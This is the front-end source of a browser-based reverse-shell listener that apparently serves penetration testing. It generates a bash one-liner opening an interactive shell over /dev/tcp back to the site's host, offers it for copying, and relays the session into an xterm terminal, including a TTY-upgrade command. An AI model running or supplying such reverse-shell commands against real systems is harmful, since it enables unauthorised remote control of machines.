import { Terminal } from 'xterm'
import { FitAddon } from 'xterm-addon-fit'
import 'xterm/css/xterm.css'
import './app.css'

let command
const commandEl = document.querySelector('.command')
commandEl.addEventListener('click', () => {
  navigator.clipboard.writeText(command)
})

const setCommand = (data) => {
  command = (
    `bash -c 'exec<>/dev/tcp/${location.hostname}/${data.port};` +
    `echo>&0 ${data.id};$0 -i<&0>&0 2>&0'`
  )
  commandEl.textContent = command
}

const startSession = async () => {
  const result = await fetch('/start', { method: 'POST' })
  const { token } = await result.json()
  history.replaceState('', '', `/${token}`)
  return token
}

const getUrlSession = () => {
  const token = location.pathname.slice(1)
  if (!token) {
    return
  }
  return token
}

const term = new Terminal({ convertEol: true })
const fitAddon = new FitAddon()
term.loadAddon(fitAddon)
term.open(document.querySelector('.term'))
fitAddon.fit()
addEventListener('resize', () => fitAddon.fit())

self.fitAddon = fitAddon
self.term = term

let conn

const ttyEl = document.querySelector('.tty')
ttyEl.addEventListener('click', () => {
  if (!conn) {
    return
  }
  conn.send(`SHELL=/bin/bash script -q /dev/null -c 'stty rows ${term.rows} cols ${term.cols};exec $0'\n`)
})

const connect = async (token) => {
  const wsUrl = new URL(location)
  wsUrl.protocol = wsUrl.protocol.replace('http', 'ws')
  wsUrl.pathname = `/connect/${token}`
  let init
  conn = new WebSocket(wsUrl)
  conn.addEventListener('message', async (event) => {
    const data = await event.data.text()
    if (!init) {
      init = JSON.parse(data)
      if (!init.ok) {
        return connect(await startSession())
      }
      setCommand(init)
      term.onData((e) => conn.send(e))
      return
    }
    term.write(data)
  })
}

;(async () => {
  const token = getUrlSession() ?? await startSession()
  connect(token)
})()
